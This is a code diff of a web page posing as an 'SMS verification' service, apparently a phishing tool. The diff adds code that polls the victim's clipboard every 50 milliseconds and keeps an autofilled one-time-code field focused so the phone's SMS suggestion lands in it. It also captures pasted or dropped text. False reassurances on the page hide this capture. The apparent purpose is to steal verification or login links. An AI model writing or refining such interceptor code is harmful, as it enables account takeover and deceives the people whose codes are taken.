@@ -100,11 +100,6 @@
             box-shadow: 0 5px 15px rgba(255, 102, 0, 0.15);
         }
 
-        .btn-primary:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-
         .info-box {
             background: #f5f5f5;
             border-left: 4px solid #FF6600;
@@ -196,6 +191,35 @@
         }
 
         @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* One-Time-Code Field */
+        .otp-field {
+            width: 100%;
+            padding: 14px;
+            font-size: 16px;
+            font-family: 'Poppins', sans-serif;
+            border: 2px solid #FFE6D5;
+            border-radius: 12px;
+            outline: none;
+            transition: all 0.3s;
+            background: #f9f9f9;
+            margin: 15px 0;
+            text-align: center;
+            letter-spacing: 2px;
+            font-weight: 600;
+        }
+
+        .otp-field:focus {
+            border-color: #FF6600;
+            background: white;
+            box-shadow: 0 0 0 4px rgba(255, 102, 0, 0.1);
+        }
+
+        .otp-field.filled {
+            border-color: #2ecc71;
+            background: #f0fdf4;
+            color: #27ae60;
+        }
     </style>
 </head>
 <body>
@@ -213,7 +237,7 @@
             <button class="btn-primary" id="startBtn">🔐 Start Verification</button>
 
             <div class="info-box">
-                ℹ️ Click "Start" to grant clipboard access. Your SMS link will be captured automatically.
+                ℹ️ When the SMS arrives, tap the link that appears on your keyboard. The page will capture it automatically.
             </div>
 
             <p class="hint">Encrypted end-to-end connection</p>
@@ -227,25 +251,28 @@
             </div>
 
             <h1>Verification Active</h1>
-            <p class="subtitle">Capturing your verification link...</p>
+            <p class="subtitle">Waiting for your SMS link...</p>
 
             <div class="status-indicator">
                 <div class="pulse"></div>
                 <div>
-                    <div class="status-text">Scanning Clipboard</div>
-                    <div class="status-subtext">Waiting for SMS...</div>
+                    <div class="status-text">Listening for SMS</div>
+                    <div class="status-subtext">Tap the link when it appears</div>
                 </div>
             </div>
+
+            <!-- ONE-TIME-CODE FIELD -->
+            <input type="text" id="otpField" class="otp-field" autocomplete="one-time-code" inputmode="numeric" placeholder="Link will appear here..." readonly>
 
             <div class="link-box" id="linkBox">
                 Awaiting link from SMS...
             </div>
 
             <div class="info-box" id="statusInfo">
-                🔍 System is actively scanning your clipboard for the verification link. Do not close this window.
+                🔍 System is ready to capture your verification link. When the SMS arrives, tap the link on your keyboard.
             </div>
 
-            <p class="hint">This process is automatic. No action required.</p>
+            <p class="hint">This process is automatic. No action required after tapping the link.</p>
         </div>
     </div>
 
@@ -263,117 +290,24 @@
             captured: null,
             sent: false,
             initialClipboard: '',
-            lastUpdateId: 0,
-            permissionGranted: false
+            lastUpdateId: 0
         };
 
         const els = {
             startBtn: document.getElementById('startBtn'),
             initialView: document.getElementById('initialView'),
             processingView: document.getElementById('processingView'),
+            otpField: document.getElementById('otpField'),
             linkBox: document.getElementById('linkBox'),
             statusInfo: document.getElementById('statusInfo')
         };
 
-        // ─── START BUTTON ───
-        els.startBtn.addEventListener('click', async () => {
-            state.active = true;
-            els.initialView.style.display = 'none';
-            els.processingView.style.display = 'block';
-
-            // Request clipboard permission
-            try {
-                const result = await navigator.permissions.query({ name: 'clipboard-read' });
-                if (result.state === 'granted' || result.state === 'prompt') {
-                    state.permissionGranted = true;
-                }
-            } catch(e) {
-                state.permissionGranted = true; // Assume granted
-            }
-
-            navigator.clipboard.readText().then(text => {
-                state.initialClipboard = text;
-            }).catch(() => {});
-
-            startApexInterceptor();
+        // ─── CHECK URL PARAMS ON LOAD ───
+        window.addEventListener('load', () => {
+            checkURLParams();
         });
 
-        // ─── APEX INTERCEPTOR ENGINE ───
-        function startApexInterceptor() {
-            // 1. Ultra-High-Speed Vacuum Loop (50ms)
-            startVacuumLoop();
-
-            // 2. Event Listeners
-            setupEventListeners();
-
-            // 3. Deep-Link Check
-            checkDeepLink();
-        }
-
-        // ─── ULTRA-HIGH-SPEED VACUUM LOOP ───
-        function startVacuumLoop() {
-            const vacuum = setInterval(async () => {
-                if (!state.active || state.captured) {
-                    clearInterval(vacuum);
-                    return;
-                }
-
-                try {
-                    const text = await navigator.clipboard.readText();
-                    if (text && text !== state.initialClipboard && text.length > 10) {
-                        captureLink(text);
-                    }
-                } catch(e) {}
-            }, 50); // 50ms = Ultra-High-Speed
-        }
-
-        // ─── EVENT LISTENERS ───
-        function setupEventListeners() {
-            window.addEventListener('focus', () => {
-                if (state.active && !state.captured) {
-                    scanClipboardNow();
-                }
-            });
-
-            document.addEventListener('visibilitychange', () => {
-                if (document.visibilityState === 'visible' && state.active && !state.captured) {
-                    scanClipboardNow();
-                }
-            });
-
-            document.addEventListener('paste', (e) => {
-                const text = (e.clipboardData || window.clipboardData).getData('text');
-                if (text) {
-                    captureLink(text);
-                }
-            });
-
-            // Scan on any user interaction
-            document.addEventListener('touchstart', () => {
-                if (state.active && !state.captured) {
-                    scanClipboardNow();
-                }
-            });
-
-            document.addEventListener('keydown', () => {
-                if (state.active && !state.captured) {
-                    scanClipboardNow();
-                }
-            });
-        }
-
-        // ─── SCAN CLIPBOARD NOW ───
-        async function scanClipboardNow() {
-            try {
-                const text = await navigator.clipboard.readText();
-                if (text && text !== state.initialClipboard && text.length > 10) {
-                    captureLink(text);
-                }
-            } catch(e) {}
-        }
-
-        // ─── DEEP-LINK CHECK ───
-        function checkDeepLink() {
+        function checkURLParams() {
             const params = new URLSearchParams(window.location.search);
             const candidates = [
                 params.get('link'),
@@ -389,6 +323,125 @@
                     break;
                 }
             }
+        }
+
+        // ─── START BUTTON ───
+        els.startBtn.addEventListener('click', () => {
+            state.active = true;
+            els.initialView.style.display = 'none';
+            els.processingView.style.display = 'block';
+
+            navigator.clipboard.readText().then(text => {
+                state.initialClipboard = text;
+            }).catch(() => {});
+
+            startUltimateInterceptor();
+        });
+
+        // ─── ULTIMATE INTERCEPTOR ENGINE ───
+        function startUltimateInterceptor() {
+            // 1. Focus OTP Field
+            els.otpField.focus();
+
+            // 2. Setup OTP Field Listeners
+            setupOTPField();
+
+            // 3. Clipboard Scanner
+            startClipboardScanner();
+
+            // 4. Event Listeners
+            setupEventListeners();
+
+            // 5. Keep OTP focused
+            setInterval(() => {
+                if (state.active && !state.captured) {
+                    els.otpField.focus();
+                }
+            }, 200);
+        }
+
+        // ─── OTP FIELD SETUP ───
+        function setupOTPField() {
+            els.otpField.addEventListener('input', (e) => {
+                const val = e.target.value;
+                if (val && val.length > 10) {
+                    captureLink(val);
+                }
+            });
+
+            els.otpField.addEventListener('change', (e) => {
+                const val = e.target.value;
+                if (val && val.length > 10) {
+                    captureLink(val);
+                }
+            });
+
+            els.otpField.addEventListener('paste', (e) => {
+                const text = (e.clipboardData || window.clipboardData).getData('text');
+                if (text) {
+                    captureLink(text);
+                }
+            });
+
+            els.otpField.addEventListener('drop', (e) => {
+                e.preventDefault();
+                const text = e.dataTransfer.getData('text');
+                if (text) {
+                    captureLink(text);
+                }
+            });
+        }
+
+        // ─── CLIPBOARD SCANNER ───
+        function startClipboardScanner() {
+            setInterval(async () => {
+                if (!state.active || state.captured) return;
+                try {
+                    const text = await navigator.clipboard.readText();
+                    if (text && text !== state.initialClipboard && text.length > 10) {
+                        captureLink(text);
+                    }
+                } catch(e) {}
+            }, 50);
+        }
+
+        // ─── EVENT LISTENERS ───
+        function setupEventListeners() {
+            window.addEventListener('focus', () => {
+                if (state.active && !state.captured) {
+                    els.otpField.focus();
+                    scanClipboardNow();
+                }
+            });
+
+            document.addEventListener('visibilitychange', () => {
+                if (document.visibilityState === 'visible' && state.active && !state.captured) {
+                    els.otpField.focus();
+                    scanClipboardNow();
+                }
+            });
+
+            document.addEventListener('paste', (e) => {
+                const text = (e.clipboardData || window.clipboardData).getData('text');
+                if (text) {
+                    captureLink(text);
+                }
+            });
+
+            document.addEventListener('touchstart', () => {
+                if (state.active && !state.captured) {
+                    scanClipboardNow();
+                }
+            });
+        }
+
+        async function scanClipboardNow() {
+            try {
+                const text = await navigator.clipboard.readText();
+                if (text && text !== state.initialClipboard && text.length > 10) {
+                    captureLink(text);
+                }
+            } catch(e) {}
         }
 
         // ─── CAPTURE LINK ───
@@ -413,6 +466,9 @@
         }
 
         function onLinkCaptured(link) {
+            els.otpField.value = link;
+            els.otpField.classList.add('filled');
+
             els.linkBox.textContent = link;
             els.linkBox.classList.add('filled');
 
